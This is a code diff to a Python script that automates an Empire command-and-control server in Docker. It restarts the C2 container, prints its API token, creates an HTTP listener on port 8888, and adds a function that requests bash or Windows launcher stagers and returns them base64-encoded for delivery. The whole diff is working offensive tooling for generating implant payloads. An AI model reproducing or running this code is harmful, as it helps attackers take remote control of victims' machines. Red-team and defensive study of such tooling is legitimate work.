@@ -3,6 +3,7 @@ import os
 import subprocess
 import requests
 import json
+import base64
 from time import sleep
 
 def c2() -> None | str:
@@ -14,10 +15,11 @@ def c2() -> None | str:
             if "empire" in container.attrs['Config']['Image']:
                 print('[+] Detected an existing C2 container')
                 is_up = 1
-                client.containers.list(all)[i].start()
+                container = client.containers.list(all)[i].start()
                 sleep(25)
                 token = c2_token()
-                print('[+] C2 started successfully from existing docker (ID: {0}'.format(client.containers.list(all)[i].short_id))
+                print('[+] C2 started successfully from existing docker (ID: {0})'.format(client.containers.list(all)[i].short_id))
+                print('[+] C2 token : {0}'.format(token))
                 print('[+] Listening on port 8888 (CLIHTTP)')
                 return client.containers.list(all)[i].short_id, token
         if is_up == 0:
@@ -55,15 +57,30 @@ def c2_token():
     r_c2 = requests.post(url_c2, headers=headers, json=param, verify=False)
     json_token = json.loads(r_c2.text)
     token = json_token['token']
-    url_listener = 'https://localhost:1337/api/listeners/http?token={0}'.format(str(token))
-    param_listener = {"Name":"CLIHTTP", "Port":"8888"}
-    r_listener = requests.post(url_listener, headers=headers, json=param_listener, verify=False)
+    c2_listener(token)
     return token
 
-def get_stager(system):
+def c2_listener(token):
+    url_listener = 'https://localhost:1337/api/listeners/http?token={0}'.format(str(token))
+    param_listener = {"Name":"CLIHTTP", "Port":"8888"}
+    headers = {"Content-Type": "application/json"}
+    requests.post(url_listener, headers=headers, json=param_listener, verify=False)
+
+def get_stager(system, token):
     if system == 'linux':
-        print(system)
+        system = 'multi/bash'
     elif system == 'windows':
-        print(system)
+        system = 'multi/launcher'
     else:
-        return "[-] Error: OS not defined."
+        return "Error: OS not defined."
+
+    url_stager = 'https://localhost:1337/api/stagers?token={0}'.format(token)
+    param_stager = {"StagerName":"{0}".format(system), "Listener":"CLIHTTP"}
+    headers_stager = {"Content-Type": "application/json"}
+    r_stager = requests.post(url_stager, headers=headers_stager, json=param_stager, verify=False)
+    payload = json.loads(r_stager.text)
+    payload = payload[system]['Output']
+    message_bytes = payload.encode('ascii')
+    rs_b64 = base64.b64encode(message_bytes)
+
+    return rs_b64
